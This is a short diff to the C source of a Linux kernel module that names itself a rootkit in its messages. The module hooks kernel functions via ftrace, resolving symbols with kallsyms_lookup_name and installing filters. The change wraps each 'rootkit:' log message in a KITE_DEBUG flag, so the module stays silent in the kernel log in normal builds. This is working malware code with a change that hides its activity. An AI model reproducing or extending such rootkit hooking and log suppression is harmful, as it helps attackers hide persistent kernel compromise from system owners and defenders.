@@ -110,11 +110,13 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
         hook->address = (unsigned long*)kallsyms_lookup_name(hook->name); // find syscall table symlink and get table address
     #else
         hook->address = NULL;
-    #endif
+#endif
 
 	if (!hook->address)
 	{
+#ifdef KITE_DEBUG
 		pr_info("rootkit: unresolved symbol: %s\n", hook->name);
+#endif
 		return -ENOENT;
 	}
 
@@ -183,7 +185,9 @@ int fh_install_hook(struct ftrace_hook *hook)
 	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0); // prepare the function to be traced by its address by setting a filter on the address with ops
 	if(err)
 	{
+#ifdef KITE_DEBUG
 		pr_info("rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+#endif
 		return err;
 	}
 
@@ -202,7 +206,9 @@ int fh_install_hook(struct ftrace_hook *hook)
 												// locking ftracing mutex to start changes and then unlocking it
 	if(err)
 	{
+#ifdef KITE_DEBUG
 		pr_info("rootkit: register_ftrace_function() failed: %d\n", err);
+#endif
 		return err;
 	}
 
@@ -222,13 +228,19 @@ void fh_remove_hook(struct ftrace_hook *hook)
 	err = unregister_ftrace_function(&hook->ops);
 	if(err)
 	{
+#ifdef KITE_DEBUG
 		pr_info("rootkit: unregister_ftrace_function() failed: %d\n", err);
+#endif
+
 	}
 
 	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0); // remove the address from ftrace filter
 	if(err)
 	{
+#ifdef KITE_DEBUG
 		pr_info("rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+#endif
+
 	}
 }
 
